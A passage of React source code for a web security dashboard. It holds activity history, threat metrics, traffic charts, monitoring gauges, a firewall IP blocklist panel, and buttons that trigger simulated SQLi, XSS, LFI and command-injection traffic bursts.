                    {notifications.length > 0 && <button onClick={() => engine.clearNotifications()} style={{ fontSize: 11, color: 'var(--e-muted)', cursor: 'pointer' }}>Clear All</button>}
                  </div>
                  <div style={{ maxHeight: 400, overflowY: 'auto' }}>
                    {recentNotifications.length === 0 ? (
                      <div style={{ padding: 30, textAlign: 'center', color: 'var(--e-muted)', fontSize: 13 }}>No recent activity</div>
                    ) : (
                      recentNotifications.map(n => (
                        <div key={n.id} style={{ padding: 16, borderBottom: '1px solid rgba(255,255,255,0.05)', background: n.read ? 'transparent' : 'rgba(0,255,156,0.05)' }}>
                          <div style={{ fontSize: 12, fontWeight: 600, color: n.severity === 'critical' ? 'var(--red)' : n.severity === 'high' ? 'var(--orange)' : 'white' }}>{n.title}</div>
                          <div style={{ fontSize: 11, color: 'var(--e-muted)', marginTop: 4, lineHeight: 1.4 }}>{n.message}</div>
                          <div style={{ fontSize: 9, color: 'rgba(255,255,255,0.3)', marginTop: 6, fontFamily: 'monospace' }}>{new Date(n.timestamp).toLocaleTimeString()}</div>
                        </div>
                      ))
                    )}
                  </div>
                </div>
              )}
            </div>

            <button className="evolve-btn-outline" style={{ padding: '8px 16px', fontSize: '13px' }} onClick={() => navigate('/profile')}>
              <HiOutlineUser /> {user?.name?.split(' ')[0] || user?.username}
              {engine.isPremium() && <span style={{ marginLeft: 6, color: '#eab308' }}>★</span>}
            </button>
          </div>
        </header>
        <main className="content">
          <Outlet />
        </main>
      </div>
    </div>
  );
}

function Activity() {
  const [activities, setActivities] = useState([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(0);
  const [hasMore, setHasMore] = useState(true);

  useEffect(() => {
    loadActivities();
  }, [page]);

  const loadActivities = async () => {
    setLoading(true);
    const data = await engine.fetchActivity(50, page * 50);
    if (page === 0) {
      setActivities(data.activities);
    } else {
      setActivities(prev => [...prev, ...data.activities]);
    }
    setHasMore(data.activities.length === 50);
    setLoading(false);
  };

  return (
    <div style={{ padding: '20px', maxWidth: '1200px', margin: '0 auto' }}>
      <div style={{ marginBottom: '20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h1 style={{ color: 'var(--text)', fontSize: '28px', fontWeight: '700', margin: 0 }}>Activity History</h1>
          <p style={{ color: 'var(--muted)', margin: '8px 0 0 0' }}>Track your account actions and system events</p>
        </div>
        <div style={{ display: 'flex', gap: '10px' }}>
          <button onClick={() => engine.downloadActivity('csv')} style={{ padding: '8px 16px', background: 'var(--primary)', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer' }}>Export CSV</button>
          <button onClick={() => engine.downloadActivity('json')} style={{ padding: '8px 16px', background: 'var(--secondary)', color: 'white', border: 'none', borderRadius: '6px', cursor: 'pointer' }}>Export JSON</button>
        </div>
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
        {activities.map((activity, i) => (
          <motion.div
            key={activity.id || i}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.05 }}
            style={{
              background: 'rgba(8,11,16,.5)',
              border: '1px solid rgba(255,255,255,0.05)',
              borderRadius: '12px',
              padding: '16px',
              display: 'flex',
              alignItems: 'center',
              gap: '12px'
            }}
          >
            <div style={{
              width: '8px',
              height: '8px',
              borderRadius: '50%',
              background: activity.action_type === 'LOGIN' ? 'var(--green)' : activity.action_type === 'ADD_WEBSITE' ? 'var(--cyan)' : 'var(--orange)',
              flexShrink: 0
            }} />
            <div style={{ flex: 1 }}>
              <div style={{ fontSize: '14px', color: 'var(--text)', fontWeight: '500' }}>{activity.description}</div>
              <div style={{ fontSize: '12px', color: 'var(--muted)', marginTop: '4px' }}>
                {new Date(activity.timestamp).toLocaleString()}
              </div>
            </div>
          </motion.div>
        ))}

        {loading && (
          <div style={{ textAlign: 'center', padding: '20px', color: 'var(--muted)' }}>
            Loading...
          </div>
        )}

        {hasMore && !loading && (
          <button
            onClick={() => setPage(p => p + 1)}
            style={{
              padding: '10px 20px',
              background: 'var(--primary)',
              color: 'white',
              border: 'none',
              borderRadius: '8px',
              cursor: 'pointer',
              marginTop: '20px'
            }}
          >
            Load More
          </button>
        )}
      </div>
    </div>
  );
}

function Dashboard() {
  useEngineSnapshot(() => engine.getStateVersion());
  const stats = engine.getStats();
  const allLog = engine.getLog();
  const log = allLog.slice(0, 30);
  const blocked = engine.getBlockedIPs();
  const threatScore = engine.getThreatScore();
  const [previousThreatScore, setPreviousThreatScore] = useState(threatScore);
  const [tab, setTab] = useState(0);

  // Track threat score changes for trend indicator
  useEffect(() => {
    setPreviousThreatScore(threatScore);
  }, [threatScore]);
  const [trafficWindow, setTrafficWindow] = useState('1h');

  const chartData = buildTrafficSeries(allLog, trafficWindow);

  const gaugeColor = threatScore >= 70 ? 'var(--red)' : threatScore >= 40 ? 'var(--yellow)' : 'var(--green)';

  const handleFileUpload = (e) => {
    const file = e.target.files[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (ev) => {
      const text = ev.target.result;
      const count = engine.parseAndInjectLogs(text);
      if (count > 0) alert(`FORENSIC ENGINE SUCCESS: Interpolated ${count} access log events directly into the Fusion Dashboard map matrices.`);
      else alert(`FORENSIC FATAL: No Nginx/Apache logs mapped.`);
    };
    reader.readAsText(file);
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div className="dash-header" style={{ marginBottom: '40px', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
        <div>
          <h1 style={{ fontFamily: 'Anton', letterSpacing: '-0.02em', fontSize: '42px', margin: 0, textTransform: 'uppercase' }}>Fusion Dashboard</h1>
          <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace' }}>Global threat aggregation and edge defense metrics</p>
        </div>
        <div style={{ textAlign: 'right' }}>
          <label className="evolve-button-secondary" style={{ display: 'inline-block', cursor: 'pointer', padding: '8px 16px', border: '1px solid var(--e-muted)', borderRadius: 4, fontSize: 12 }}>
            <HiOutlineMagnifyingGlass style={{ marginRight: 6, verticalAlign: 'middle', marginTop: -2 }} />
            Upload Forensic Log (.log)
            <input type="file" accept=".log,.txt" style={{ display: 'none' }} onChange={handleFileUpload} />
          </label>
        </div>
      </div>

      <div className="metrics-row" style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: '20px', marginBottom: '40px' }}>
        <div className="glass-card">
          <div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>TOTAL EVENTS</div>
          <div className="metric-value" style={{ fontSize: '28px', fontWeight: '800', color: 'white' }}>
            <AnimatedNumber value={stats.total} />
          </div>
          <div className="metric-delta" style={{ color: 'var(--cyan)' }}>database</div>
        </div>
        <div className="glass-card">
          <div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>REAL-TIME VISITORS</div>
          <div className="metric-value" style={{ color: 'var(--e-green)', fontSize: '28px', fontWeight: '800' }}>
            <AnimatedNumber value={stats.visitors} />
          </div>
          <div className="metric-delta" style={{ color: 'var(--e-green)' }}>live</div>
        </div>
        <div className="glass-card">
          <div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>MITIGATED</div>
          <div className="metric-value" style={{ color: 'var(--green)', fontSize: '28px', fontWeight: '800' }}>
            <AnimatedNumber value={stats.blocked} />
          </div>
          <div className="metric-delta" style={{ color: 'var(--green)' }}>{stats.blockRate}% rate</div>
        </div>
        <div className="glass-card">
          <div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>ACTIVE BANS</div>
          <div className="metric-value" style={{ fontSize: '28px', fontWeight: '800', color: 'white' }}>
            <AnimatedNumber value={blocked.length} />
          </div>
          <div className="metric-delta" style={{ color: 'var(--muted)' }}>reputation engine</div>
        </div>
        <div className="glass-card" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px' }}>
          <div>
            <div className="metric-label" style={{ color: 'var(--e-muted)', fontSize: '12px' }}>DECAYED THREAT</div>
            <div className="metric-value" style={{ color: 'white', fontSize: '28px', fontWeight: '800', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <AnimatedNumber value={threatScore} />
              {threatScore > previousThreatScore && <span style={{ color: 'var(--red)', fontSize: '16px' }}>↑</span>}
              {threatScore < previousThreatScore && <span style={{ color: 'var(--green)', fontSize: '16px' }}>↓</span>}
            </div>
            <div className="metric-delta" style={{ color: gaugeColor, fontSize: 9 }}>{threatScore >= 70 ? 'CRITICAL STATE' : threatScore >= 40 ? 'ELEVATED RISK' : 'SYSTEM CLEAN'}</div>
          </div>
          <div style={{ marginRight: -10 }}>
            <ThreatPulseOrb score={threatScore} />
          </div>
        </div>
      </div>

      {/* Premium Upgrade Banner (Free users only) */}
      {!engine.isPremium() && (
        <div style={{ marginBottom: 24, padding: '16px 24px', background: 'linear-gradient(135deg, rgba(255,215,0,0.04), rgba(255,140,0,0.04))', border: '1px solid rgba(255,215,0,0.15)', borderRadius: 12, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 16 }}>
            <span style={{ fontSize: 24 }}>⭐</span>
            <div>
              <div style={{ fontSize: 13, fontWeight: 700, color: '#ffd700' }}>Unlock Premium Features</div>
              <div style={{ fontSize: 11, color: 'var(--e-muted)', marginTop: 2 }}>DDoS Shield Pro, Custom WAF Rules, Geo-Blocking, Advanced Reports & more</div>
            </div>
          </div>
          <Link to="/pricing" style={{ padding: '8px 20px', background: 'linear-gradient(135deg, #ffd700, #ff8c00)', borderRadius: 6, color: '#000', fontSize: 12, fontWeight: 700, textDecoration: 'none', letterSpacing: 1, whiteSpace: 'nowrap' }}>Upgrade Now →</Link>
        </div>
      )}

      <div className="tab-bar">
        {DASH_TABS.map((t, i) => <button key={i} className={`tab-btn ${tab === i ? 'active' : ''}`} onClick={() => setTab(i)}>{t}</button>)}
      </div>

      <TabErrorBoundary>
        {tab === 0 && (
          <CommandCenter
            log={log}
            chartData={chartData}
            trafficWindow={trafficWindow}
            setTrafficWindow={setTrafficWindow}
            threatScore={threatScore}
            gaugeColor={gaugeColor}
            blocked={blocked}
          />
        )}
        {tab === 1 && <MonitoringTab />}
        {tab === 2 && <FirewallTab blocked={blocked} />}
        {tab === 3 && <ReplayTab log={log} />}
        {tab === 4 && <ThreatIntelTab />}
        {tab === 5 && <MapTab stats={stats} />}
        {tab === 6 && <AnalyticsTab stats={stats} />}
        {tab === 7 && <ReportsTab stats={stats} blocked={blocked} />}
        {tab === 8 && <WebsiteProtectionTab />}
        {tab === 9 && <DDoSShieldTab />}
      </TabErrorBoundary>
    </MotionDiv>
  );
}

function CommandCenter({ log, chartData, trafficWindow, setTrafficWindow, threatScore, gaugeColor, blocked }) {
  const isAutoPilot = useEngineSnapshot(engine.isAutoPilotActive);
  const backendHealth = useEngineSnapshot(engine.getBackendHealth);
  const attacksInWindow = chartData.reduce((sum, point) => sum + point.attacks, 0);
  const selectedWindow = TRAFFIC_WINDOWS.find((w) => w.key === trafficWindow) || TRAFFIC_WINDOWS[0];
  const wafOnline = backendHealth.status === 'ok';
  const modelVersion = backendHealth.version ? `v${backendHealth.version}` : 'n/a';

  return (
    <>
      <div className="attack-lab" style={{ display: 'flex', gap: 16, alignItems: 'center' }}>
        <div style={{ display: 'flex', gap: 8 }}>
          {['SQLi', 'XSS', 'LFI', 'CMDi'].map((t) => (
            <button key={t} className="attack-btn" onClick={() => engine.simulateBurst(t)}>
              {t} Burst
            </button>
          ))}
        </div>
        <div style={{ height: 24, width: 1, background: 'rgba(255,255,255,0.1)' }} />
        <button
          className={`autopilot-btn ${isAutoPilot ? 'active' : ''}`}
          onClick={() => isAutoPilot ? engine.stopAutoPilot() : engine.startAutoPilot()}
          style={{
            background: isAutoPilot ? 'rgba(0,255,150,0.1)' : 'rgba(255,255,255,0.05)',
            border: `1px solid ${isAutoPilot ? 'var(--green)' : 'rgba(255,255,255,0.1)'}`,
            color: isAutoPilot ? 'var(--green)' : 'var(--text)',
            padding: '8px 16px', borderRadius: 8, fontSize: 11, cursor: 'pointer',
            display: 'flex', alignItems: 'center', gap: 8, transition: 'all 0.3s ease'
          }}
        >
          <div className={`status-node ${isAutoPilot ? 'pulse' : ''}`} style={{ width: 8, height: 8, borderRadius: '50%', background: isAutoPilot ? 'var(--green)' : '#666' }} />
          SMART AUTOPILOT: {isAutoPilot ? 'ENGAGED' : 'STANDBY'}
        </button>
        <div style={{ flex: 1 }}>
          <MiniTicker log={log} />
        </div>
      </div>

      <div className="dash-grid">
        <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: 16 }}>
          <div className="glass-card" style={{ display: 'flex', flexDirection: 'column', minHeight: 340 }}>
            <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 16, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <HiOutlineBolt color="var(--cyan)" />
                Global Traffic Analysis
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                <div style={{ fontSize: 10, color: 'var(--e-muted)', fontFamily: 'var(--mono)' }}>{attacksInWindow} ATTACKS • {selectedWindow.longLabel.toUpperCase()}</div>
                <div style={{ display: 'flex', gap: 6 }}>
                  {TRAFFIC_WINDOWS.map((option) => (
                    <button
                      key={option.key}
                      onClick={() => setTrafficWindow(option.key)}
                      style={{
                        padding: '4px 10px',
                        borderRadius: 999,
                        border: `1px solid ${trafficWindow === option.key ? 'rgba(0,255,238,0.45)' : 'transparent'}`,
                        background: trafficWindow === option.key ? 'rgba(0,255,238,0.08)' : 'transparent',
                        color: trafficWindow === option.key ? 'var(--cyan)' : 'rgba(255,255,255,0.42)',
                        fontSize: 10,
                        fontFamily: 'var(--mono)',
                        cursor: 'pointer',
                        letterSpacing: '.04em',
                        transition: 'all 0.2s ease',
                      }}
                    >
                      {option.label}
                    </button>
                  ))}
                </div>
              </div>
            </div>
            <div style={{ flex: 1, minHeight: 250 }}>
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={chartData}>
                  <defs>
                    <linearGradient id="grad" x1="0" y1="0" x2="0" y2="1"><stop offset="5%" stopColor="var(--cyan)" stopOpacity={0.3} /><stop offset="95%" stopColor="var(--cyan)" stopOpacity={0} /></linearGradient>
                  </defs>
                  <XAxis dataKey="t" tick={{ fill: '#4A6080', fontSize: 10 }} axisLine={false} tickLine={false} />
                  <YAxis tick={{ fill: '#4A6080', fontSize: 10 }} axisLine={false} tickLine={false} />
                  <Tooltip contentStyle={{ background: '#11161C', border: '1px solid #1C2535', borderRadius: 8, fontSize: 11, fontFamily: 'var(--mono)' }} />
                  <Area type="monotone" dataKey="attacks" stroke="var(--cyan)" fill="url(#grad)" strokeWidth={2} />
                  <Area type="monotone" dataKey="blocked" stroke="var(--green)" fill="none" strokeWidth={1.5} strokeDasharray="4 2" />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </div>

          <div className="glass-card" style={{ display: 'flex', flexDirection: 'column', minHeight: 340 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
              <span style={{ fontSize: 12, fontWeight: 700, display: 'flex', alignItems: 'center', gap: 8 }}>
                <HiOutlineServerStack color="var(--cyan)" />
                Live SOC Activity Feed
              </span>
              <span className="neon-pill" style={{ opacity: 0.8 }}>
                <span className="live-dot" /> STREAMING
              </span>
            </div>
            <div className="feed" style={{ flex: 1, minHeight: 0, overflowY: 'auto' }}>
              {log.length === 0 && <div className="feed-empty">🟢 Platform Secure - Monitoring inbound traffic...</div>}
              {log.map((ev, i) => (
                <motion.div
                  initial={{ opacity: 0, x: -10 }}
                  animate={{ opacity: 1, x: 0 }}
                  className="feed-item"
                  key={ev.id || i}
                  style={{ borderLeft: `2px solid ${SEV_COLORS[ev.severity] || 'transparent'}`, paddingLeft: 10 }}
                >
                  <span style={{ color: 'var(--muted2)', width: 45 }}>{ev.timestamp ? ev.timestamp.slice(11, 16) : '--:--'}</span>
                  <span style={{ color: SEV_COLORS[ev.severity], fontWeight: 700, width: 50 }}>{ev.severity.slice(0, 4)}</span>
                  <span style={{ color: TYPE_COLORS[ev.attack_type], width: 60 }}>{ev.attack_type}</span>
                  <span style={{ color: 'var(--text)', width: 110 }}>{ev.src_ip}</span>
                  <span style={{ color: ev.action === 'BLOCKED' ? 'var(--green)' : 'var(--yellow)', width: 70 }}>{ev.action}</span>
                  <span style={{ color: STATUS_COLORS[normalizeEventStatus(ev.status)] || 'var(--muted2)', width: 90 }}>{normalizeEventStatus(ev.status)}</span>
                  <span className="payload-snip">{ev.payload || ev.payload_snip || 'N/A'}</span>
                </motion.div>
              ))}
            </div>
          </div>
        </div>

        <div>
          <div className="glass-card" style={{ marginBottom: 16 }}>
            <div className="gauge-wrap">
              <div className="gauge-circle" style={{ borderColor: `${gaugeColor}33`, boxShadow: `0 0 30px ${gaugeColor}15` }}>
                <div className="gauge-value" style={{ color: gaugeColor }}>{threatScore}</div>
                <div className="gauge-label">THREAT INDEX</div>
              </div>
            </div>
          </div>
          <div className="glass-card" style={{ marginBottom: 16 }}>
            <div style={{ fontSize: 10, fontFamily: 'var(--mono)', color: 'var(--muted2)', letterSpacing: '.06em', marginBottom: 16 }}>SYSTEM HEALTH (NODE-B)</div>
            <SystemMetrics metrics={engine.getStats()?.system || {}} />
            <div style={{ height: 1, background: 'rgba(255,255,255,0.05)', margin: '16px 0' }} />
            <div className="status-panel">
              <div className="status-row"><span>AutoPilot</span><span style={{ color: isAutoPilot ? 'var(--green)' : 'var(--muted)' }}>{isAutoPilot ? '● ENABLED' : '○ STANDBY'}</span></div>
              <div className="status-row"><span>WAF Cluster</span><span style={{ color: wafOnline ? 'var(--green)' : 'var(--red)' }}>{wafOnline ? '● ONLINE' : '● OFFLINE'}</span></div>
              <div className="status-row"><span>Neural Model</span><span style={{ color: backendHealth.version ? 'var(--cyan)' : 'var(--muted)' }}>{modelVersion}</span></div>
              <div className="status-row"><span>Active Blocks</span><span style={{ fontWeight: 700 }}>{blocked.length}</span></div>
            </div>
          </div>
          <div className="glass-card">
            <div style={{ fontSize: 10, fontFamily: 'var(--mono)', color: 'var(--muted2)', letterSpacing: '.06em', marginBottom: 12 }}>THREAT INTELLIGENCE</div>
            {(() => {
              const cve = engine.getCVE('SQLi');
              return (
                <div className="cve-featured">
                  <div style={{ color: 'var(--red)', fontWeight: 700, fontFamily: 'var(--mono)', fontSize: 13 }}>{cve.cve_id}</div>
                  <div style={{ display: 'flex', gap: 12, marginTop: 10, alignItems: 'center' }}>
                    <span style={{ fontSize: 28, fontWeight: 900, fontFamily: 'var(--mono)', color: 'var(--red)' }}>{cve.cvss}</span>
                    <span className="sev-tag" style={{ background: 'rgba(255,77,77,.1)', color: 'var(--red)', border: '1px solid rgba(255,77,77,.3)' }}>{cve.severity}</span>
                  </div>
                  <div style={{ fontSize: 11, color: 'var(--muted)', marginTop: 10, lineHeight: 1.6 }}>{cve.desc}</div>
                </div>
              );
            })()}
          </div>
        </div>
      </div>
    </>
  );
}

function MonitoringTab() {
  const stats = engine.getStats();
  // Safely normalize telemetry — backend may return memory/disk as flat number or as {percent} object
  const rawSys = stats.system || {};
  const sys = {
    cpu: rawSys.cpu || 0,
    memory: { percent: typeof rawSys.memory === 'object' ? (rawSys.memory?.percent ?? 0) : (rawSys.memory ?? 0) },
    disk: { percent: typeof rawSys.disk === 'object' ? (rawSys.disk?.percent ?? 0) : (rawSys.disk ?? 0) },
    uptime: rawSys.uptime || 0,
  };
  const audit = stats.audit || { security_score: 100, ssl_status: 'VALID', headers: {} };

  return (
    <div className="dash-grid">
      <div className="glass-card">
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
          <div style={{ fontSize: 14, fontWeight: 700 }}>🌍 Real-Time Website Infrastructure Status</div>
          <div style={{ fontSize: 10, background: 'var(--e-green-glow)', color: 'var(--e-green)', padding: '4px 10px', borderRadius: 20, fontWeight: 700, letterSpacing: 1 }}>
            LIVE TELEMETRY
          </div>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(140px, 1fr))', gap: 12, marginBottom: 24 }}>
          {[
            { label: 'CPU Usage', value: `${sys.cpu}%`, color: sys.cpu > 80 ? 'var(--red)' : 'var(--e-green)' },
            { label: 'RAM Usage', value: `${sys.memory.percent}%`, color: sys.memory.percent > 80 ? 'var(--red)' : 'var(--cyan)' },
            { label: 'Disk Space', value: `${sys.disk.percent}%`, color: sys.disk.percent > 90 ? 'var(--red)' : 'var(--e-green)' },
            { label: 'System Uptime', value: `${Math.floor(sys.uptime / 3600)}h ${Math.floor((sys.uptime % 3600) / 60)}m`, color: 'var(--cyan)' },
          ].map((m, i) => (
            <div key={i} className="glass-card" style={{ background: 'rgba(8,11,16,.5)', textAlign: 'center', padding: 16 }}>
              <div style={{ fontSize: 9, color: 'var(--e-muted)', fontFamily: 'var(--mono)', textTransform: 'uppercase' }}>{m.label}</div>
              <div style={{ fontSize: 22, fontWeight: 800, fontFamily: 'var(--mono)', color: m.color, marginTop: 8 }}>{m.value}</div>
            </div>
          ))}
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20, marginBottom: 24 }}>
          <div className="glass-card" style={{ background: 'rgba(255,255,255,0.02)' }}>
            <div style={{ fontSize: 11, color: 'var(--e-muted)', marginBottom: 15, fontWeight: 700 }}>HOST RESOURCE GAUGES</div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
              <div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 11, marginBottom: 6 }}>
                  <span style={{ color: 'var(--e-muted)' }}>PROCESSOR LOAD</span>
                  <span style={{ color: 'var(--e-green)', fontWeight: 700 }}>{sys.cpu}%</span>
                </div>
                <div style={{ height: 8, background: 'rgba(255,255,255,0.05)', borderRadius: 4, overflow: 'hidden' }}>
                  <motion.div initial={{ width: 0 }} animate={{ width: `${sys.cpu}%` }} style={{ height: '100%', background: 'linear-gradient(90deg, #00ff88, #00ffee)', boxShadow: '0 0 15px rgba(0,255,136,0.3)' }} />
                </div>
              </div>
              <div>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 11, marginBottom: 6 }}>
                  <span style={{ color: 'var(--e-muted)' }}>MEMORY UTILIZATION</span>
                  <span style={{ color: 'var(--cyan)', fontWeight: 700 }}>{sys.memory.percent}%</span>
                </div>
                <div style={{ height: 8, background: 'rgba(255,255,255,0.05)', borderRadius: 4, overflow: 'hidden' }}>
                  <motion.div initial={{ width: 0 }} animate={{ width: `${sys.memory.percent}%` }} style={{ height: '100%', background: 'linear-gradient(90deg, #00ccff, #0066ff)', boxShadow: '0 0 15px rgba(0,204,255,0.3)' }} />
                </div>
              </div>
            </div>
          </div>

          <div className="glass-card" style={{ background: 'rgba(0,255,136,0.03)', border: '1px solid rgba(0,255,136,0.1)' }}>
            <div style={{ fontSize: 11, color: 'var(--e-muted)', marginBottom: 15, fontWeight: 700 }}>AUTO-SHIELD SECURITY SCORE</div>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 30, height: '80%' }}>
              <div style={{ position: 'relative', width: 100, height: 100 }}>
                <svg viewBox="0 0 36 36" style={{ width: 100, height: 100, transform: 'rotate(-90deg)' }}>
                  <path d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="3" />
                  <motion.path initial={{ strokeDasharray: "0, 100" }} animate={{ strokeDasharray: `${audit.security_score}, 100` }} d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" fill="none" stroke={audit.security_score > 80 ? 'var(--e-green)' : 'var(--yellow)'} strokeWidth="3" strokeLinecap="round" />
                </svg>
                <div style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%, -50%)', fontSize: 24, fontWeight: 800, color: 'white' }}>{audit.security_score}</div>
              </div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
                <div style={{ fontSize: 13, fontWeight: 700, color: audit.ssl_status === 'VALID' ? 'var(--e-green)' : 'var(--red)' }}>
                  {audit.ssl_status === 'VALID' ? '🛡️ SSL Certificate Valid' : '⚠️ SSL Issue Detected'}
                </div>
                <div style={{ fontSize: 10, color: 'var(--e-muted)' }}>Audit Rank: {audit.security_score > 90 ? 'AAA (Elite)' : 'B (Action Required)'}</div>
                <div style={{ marginTop: 5, padding: '4px 8px', background: 'rgba(255,255,255,0.05)', borderRadius: 4, fontSize: 9, fontFamily: 'var(--mono)' }}>
                  EXPIRES: {audit.ssl_expiry ? new Date(audit.ssl_expiry).toLocaleDateString() : 'N/A'}
                </div>
              </div>
            </div>
          </div>
        </div>

        <div style={{ fontSize: 12, fontWeight: 700, marginBottom: 15, color: 'var(--e-muted)', letterSpacing: 1 }}>AUTO-DETECTED SECURITY HEADERS</div>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 1fr', gap: 10 }}>
          {['HSTS', 'CSP', 'X-Frame-Options', 'X-Content-Type'].map((h, i) => {
            const key = h === 'X-Frame-Options' ? 'XFO' : (h === 'X-Content-Type' ? 'X-Content-Type' : h);
            const active = audit.headers && audit.headers[key];
            return (
              <div key={i} className="glass-card" style={{ background: active ? 'rgba(0,255,136,0.05)' : 'rgba(255,80,80,0.05)', border: active ? '1px solid rgba(0,255,136,0.1)' : '1px solid rgba(255,80,80,0.1)', padding: 12, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                <span style={{ fontSize: 10, fontWeight: 700, color: active ? 'var(--e-green)' : 'var(--red)' }}>{h}</span>
                <span style={{ fontSize: 14 }}>{active ? '✅' : '❌'}</span>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}
function FirewallTab({ blocked }) {
  const [ip, setIp] = useState('');
  const [blockReason, setBlockReason] = useState('Manual Block');
  const [searchFilter, setSearchFilter] = useState('');
  const [geoBlocked, setGeoBlocked] = useState({ China: false, Russia: false, 'North Korea': true, Iran: false });
  const isPremium = engine.isPremium();

  const GEO_FLAGS = { China: '🇨🇳', Russia: '🇷🇺', 'North Korea': '🇰🇵', Iran: '🇮🇷', Romania: '🇷🇴', Vietnam: '🇻🇳' };
  const IP_REASONS = { '198.51.100.254': 'DDoS Test IP' };

  const filteredBlocked = blocked.filter(ipAddr => !searchFilter || ipAddr.includes(searchFilter));
  const log = engine.getRecentLog(100);

  const handleBlockIP = () => {
    if (!ip.trim()) return;
    const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if (!ipRegex.test(ip.trim())) { return; }
    engine.blockIP(ip.trim());
    setIp('');
  };

  return (
    <MotionDiv initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }}>
      <div style={{ marginBottom: 24 }}>
        <h1 style={{ fontFamily: 'Anton', fontSize: 36, margin: 0, textTransform: 'uppercase', letterSpacing: '-0.02em' }}>🧱 Firewall Panel</h1>
        <p style={{ color: 'var(--e-muted)', fontFamily: 'monospace', marginTop: 4 }}>IP blocklist management & geo-firewall control</p>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1.4fr 1fr', gap: 24 }}>
        {/* Main Blocklist */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div className="glass-card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16 }}>
              <div style={{ fontSize: 13, fontWeight: 700 }}>🚫 Blocked IP Addresses</div>
              <span style={{ fontSize: 10, background: 'rgba(255,77,77,0.15)', color: 'var(--red)', border: '1px solid rgba(255,77,77,0.3)', padding: '3px 10px', borderRadius: 20, fontWeight: 700 }}>{blocked.length} BLOCKED</span>
            </div>

            {/* Manual block form */}
            <div style={{ display: 'flex', gap: 8, marginBottom: 16 }}>
              <input
                className="input"
                placeholder="Enter IPv4 (e.g. 1.2.3.4)"
                value={ip}
                onChange={e => setIp(e.target.value)}
                onKeyDown={e => e.key === 'Enter' && handleBlockIP()}
                style={{ flex: 1, height: 38, fontSize: 12 }}
              />
              <button
                onClick={handleBlockIP}
                style={{
                  padding: '0 18px', height: 38, borderRadius: 6, fontSize: 11, fontWeight: 700, cursor: 'pointer', border: 'none', letterSpacing: 1,
                  background: ip.length >= 7 ? 'linear-gradient(135deg, #ef4444, #dc2626)' : 'rgba(255,255,255,0.05)',
                  color: ip.length >= 7 ? 'white' : 'var(--e-muted)', transition: 'all 0.2s'
                }}
              >BLOCK</button>
            </div>

            {/* Search filter */}
            {blocked.length > 0 && (
              <input
                className="input"
                placeholder="🔍 Filter blocked IPs..."
                value={searchFilter}
                onChange={e => setSearchFilter(e.target.value)}
                style={{ width: '100%', height: 34, fontSize: 11, marginBottom: 14 }}
              />
            )}

            {/* Blocked IP list */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 8, maxHeight: 360, overflowY: 'auto' }}>
              {filteredBlocked.length === 0 && (
                <div className="feed-empty">{blocked.length === 0 ? 'No IPs blocked — system is monitoring all traffic' : 'No IPs match filter'}</div>
              )}
              {filteredBlocked.map((ipAddr, i) => {
                const events = log.filter(e => e.src_ip === ipAddr).length;
                const lastEvent = log.find(e => e.src_ip === ipAddr);
                const isAutoBlocked = events >= 3;
                const reason = IP_REASONS[ipAddr] || (isAutoBlocked ? `Auto-blocked (${events} attacks)` : 'Manual block');
                const lastSeen = lastEvent ? String(lastEvent.timestamp || '').slice(11, 19) : '--';
                return (
                  <motion.div
                    key={ipAddr}
                    initial={{ opacity: 0, x: -10 }}
                    animate={{ opacity: 1, x: 0 }}
